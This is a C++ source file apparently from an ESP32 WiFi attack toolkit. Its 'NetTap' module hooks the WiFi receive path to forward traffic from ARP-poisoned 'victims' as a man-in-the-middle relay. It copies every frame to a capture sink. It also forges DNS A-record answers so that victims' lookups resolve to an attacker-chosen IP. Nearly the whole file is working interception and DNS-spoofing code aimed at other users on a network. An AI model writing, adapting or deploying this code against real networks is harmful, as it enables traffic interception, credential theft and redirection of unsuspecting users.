#include "nettap.h"
#include "../common/iprange.h"   // ipToU32

extern "C" {
    #include "esp_wifi.h"
    #include "esp_netif.h"
    #include "esp_private/wifi.h" // esp_wifi_internal_tx / reg_rxcb / free_rx_buffer
}

namespace {
    volatile bool g_relayOn = false;
    bool g_rxcbInstalled = false;
    esp_netif_t *g_espNetif = nullptr;

    uint32_t g_ourIpU = 0, g_gwIpU = 0, g_maskU = 0, g_netBaseU = 0;
    uint8_t g_ourMacR[6] = {0}, g_gwMacR[6] = {0};
    uint32_t g_forwarded = 0;

    NetTap::Victim g_rvics[254];
    int g_rvicN = 0;

    NetTap::FrameSink g_sink = nullptr;

    volatile bool g_dnsSpoofOn = false;
    uint32_t g_dnsSpoofIp = 0;        // 0 => use g_ourIpU
    uint32_t g_dnsSpoofCount = 0;
    uint8_t g_dnsScratch[600];        // reused only in the WiFi RX task (no reentrancy)

    uint16_t ipChecksum(const uint8_t *p, int len) {
        uint32_t sum = 0;
        for (int i = 0; i + 1 < len; i += 2) sum += (p[i] << 8) | p[i + 1];
        if (len & 1) sum += p[len - 1] << 8;
        while (sum >> 16) sum = (sum & 0xFFFF) + (sum >> 16);
        return (uint16_t)(~sum);
    }

    // If 'f' is a victim A-record DNS query, forge a reply (A = spoof IP) back
    // to the victim and return true (caller consumes the frame). Builds the
    // response in g_dnsScratch (never on the stack - the WiFi task stack is
    // small). Only touches unicast IPv4/UDP/53 standard A queries.
    bool spoofDns(const uint8_t *f, uint16_t len) {
        if (len < 14 + 20 + 8 + 12) return false;
        if (f[12] != 0x08 || f[13] != 0x00) return false;         // IPv4
        int ihl = (f[14] & 0x0F) * 4;
        if (ihl < 20) return false;
        if (f[14 + 9] != 17) return false;                        // UDP
        int udp = 14 + ihl;
        int dns = udp + 8;
        if ((f[udp + 2] << 8 | f[udp + 3]) != 53) return false;   // dst port 53
        if (dns + 12 > len) return false;
        if (f[dns + 2] & 0x80) return false;                      // must be a query
        if ((f[dns + 4] << 8 | f[dns + 5]) != 1) return false;    // exactly 1 question

        // Walk the QNAME to find the question end + QTYPE.
        int p = dns + 12;
        while (p < len && f[p] != 0) {
            if (f[p] & 0xC0) return false;                        // no compression in a query
            p += f[p] + 1;
        }
        if (p + 5 > len) return false;
        int nameEnd = p;                                          // points at the 0 byte
        uint16_t qtype = (f[nameEnd + 1] << 8) | f[nameEnd + 2];
        if (qtype != 1) return false;                             // only A records
        int questionEnd = nameEnd + 5;
        if (questionEnd + 16 > (int)sizeof(g_dnsScratch)) return false;

        memcpy(g_dnsScratch, f, questionEnd);
        uint8_t *s = g_dnsScratch;

        // Ethernet: reply goes back to the sender, from us.
        memcpy(s, f + 6, 6);
        memcpy(s + 6, g_ourMacR, 6);

        // Append the answer: name ptr 0xC00C, A, IN, TTL 60, RDLEN 4, IP.
        uint32_t spoof = g_dnsSpoofIp ? g_dnsSpoofIp : g_ourIpU;
        uint8_t *ans = s + questionEnd;
        ans[0] = 0xC0; ans[1] = 0x0C; ans[2] = 0; ans[3] = 1; ans[4] = 0; ans[5] = 1;
        ans[6] = 0; ans[7] = 0; ans[8] = 0; ans[9] = 60; ans[10] = 0; ans[11] = 4;
        ans[12] = (spoof >> 24) & 0xFF; ans[13] = (spoof >> 16) & 0xFF;
        ans[14] = (spoof >> 8) & 0xFF; ans[15] = spoof & 0xFF;
        int total = questionEnd + 16;

        int dnsLen = (questionEnd - dns) + 16;
        // DNS header: standard response, 1 answer.
        s[dns + 2] = 0x81; s[dns + 3] = 0x80;
        s[dns + 6] = 0; s[dns + 7] = 1;      // ANCOUNT
        s[dns + 8] = 0; s[dns + 9] = 0;      // NSCOUNT
        s[dns + 10] = 0; s[dns + 11] = 0;    // ARCOUNT

        // Swap IP src/dst, fix length + checksum.
        uint8_t srcIp[4], dstIp[4];
        memcpy(srcIp, f + 14 + 12, 4);
        memcpy(dstIp, f + 14 + 16, 4);
        memcpy(s + 14 + 12, dstIp, 4);       // we answer as the resolver
        memcpy(s + 14 + 16, srcIp, 4);       // back to the victim
        int ipTotal = ihl + 8 + dnsLen;
        s[16] = (ipTotal >> 8) & 0xFF; s[17] = ipTotal & 0xFF;
        s[24] = 0; s[25] = 0;                 // zero checksum before recompute
        uint16_t ck = ipChecksum(s + 14, ihl);
        s[24] = (ck >> 8) & 0xFF; s[25] = ck & 0xFF;

        // Swap UDP ports, fix length, drop checksum (optional for IPv4).
        uint8_t sp0 = f[udp], sp1 = f[udp + 1];
        s[udp] = 0; s[udp + 1] = 53;          // src port 53
        s[udp + 2] = sp0; s[udp + 3] = sp1;   // back to victim's port
        int udpLen = 8 + dnsLen;
        s[udp + 4] = (udpLen >> 8) & 0xFF; s[udp + 5] = udpLen & 0xFF;
        s[udp + 6] = 0; s[udp + 7] = 0;

        esp_wifi_internal_tx(WIFI_IF_STA, s, total);
        g_dnsSpoofCount++;
        return true;
    }

    // Real next-hop MAC for a frame with IP destination 'dstIp': the gateway
    // for anything off-subnet (or the gateway itself), a known victim's real
    // MAC for on-subnet victims, else nullptr (we can't place it -> drop).
    const uint8_t *nextHopMac(uint32_t dstIp) {
        if ((dstIp & g_maskU) != g_netBaseU) return g_gwMacR;
        if (dstIp == g_gwIpU) return g_gwMacR;
        for (int i = 0; i < g_rvicN; ++i) if (g_rvics[i].ip == dstIp) return g_rvics[i].mac;
        return nullptr;
    }

    // Runs in the WiFi RX task. Taps every frame to the capture sink (before
    // any rewrite), relays poisoned traffic when relaying, and hands
    // everything else to the normal network stack.
    esp_err_t rxHook(void *buffer, uint16_t len, void *eb) {
        NetTap::FrameSink sink = g_sink;
        if (sink && len >= 14) sink((const uint8_t *)buffer, len);

        if (g_relayOn && len >= 34) {
            uint8_t *f = (uint8_t *)buffer;
            bool unicast = !(f[0] & 0x01);
            if (unicast && f[12] == 0x08 && f[13] == 0x00) { // unicast IPv4
                uint32_t srcIp = ((uint32_t)f[26] << 24) | ((uint32_t)f[27] << 16) | ((uint32_t)f[28] << 8) | f[29];
                uint32_t dstIp = ((uint32_t)f[30] << 24) | ((uint32_t)f[31] << 16) | ((uint32_t)f[32] << 8) | f[33];
                if (dstIp != g_ourIpU && srcIp != g_ourIpU) {   // pure MITM traffic
                    // DNS spoof first: answer A queries ourselves and consume.
                    if (g_dnsSpoofOn && spoofDns(f, len)) { esp_wifi_internal_free_rx_buffer(eb); return ESP_OK; }
                    const uint8_t *nh = nextHopMac(dstIp);
                    if (nh) {
                        memcpy(f, nh, 6);
                        memcpy(f + 6, g_ourMacR, 6);
                        esp_wifi_internal_tx(WIFI_IF_STA, buffer, len);
                        g_forwarded++;
                    }
                    esp_wifi_internal_free_rx_buffer(eb);
                    return ESP_OK;
                }
            }
        }
        return esp_netif_receive(g_espNetif, buffer, len, eb);
    }
}

namespace NetTap {

bool ensureHook() {
    if (g_rxcbInstalled) return true;
    g_espNetif = esp_netif_get_handle_from_ifkey("WIFI_STA_DEF");
    if (!g_espNetif) return false;
    if (esp_wifi_internal_reg_rxcb(WIFI_IF_STA, rxHook) == ESP_OK) g_rxcbInstalled = true;
    return g_rxcbInstalled;
}

void configureRelay(const IPAddress &ourIp, const uint8_t ourMac[6],
                    const IPAddress &gwIp, const uint8_t gwMac[6],
                    const IPAddress &mask, const Victim *victims, int n) {
    g_ourIpU = ipToU32(ourIp);
    g_maskU = ipToU32(mask);
    g_netBaseU = g_ourIpU & g_maskU;
    g_gwIpU = ipToU32(gwIp);
    memcpy(g_ourMacR, ourMac, 6);
    memcpy(g_gwMacR, gwMac, 6);
    g_rvicN = n > 254 ? 254 : n;
    for (int i = 0; i < g_rvicN; ++i) g_rvics[i] = victims[i];
    g_forwarded = 0;
}

void relayEnable(bool on) {
    if (on) { if (!ensureHook()) return; }
    g_relayOn = on;
}

bool relayActive() { return g_relayOn; }
uint32_t forwarded() { return g_forwarded; }

void setSink(FrameSink sink) {
    if (sink) ensureHook();
    g_sink = sink;
}

void setDnsSpoof(bool on, uint32_t spoofIp) {
    if (on) ensureHook();
    g_dnsSpoofIp = spoofIp;
    g_dnsSpoofCount = 0;
    g_dnsSpoofOn = on;
}
bool dnsSpoofActive() { return g_dnsSpoofOn; }
uint32_t dnsSpoofed() { return g_dnsSpoofCount; }

} // namespace NetTap
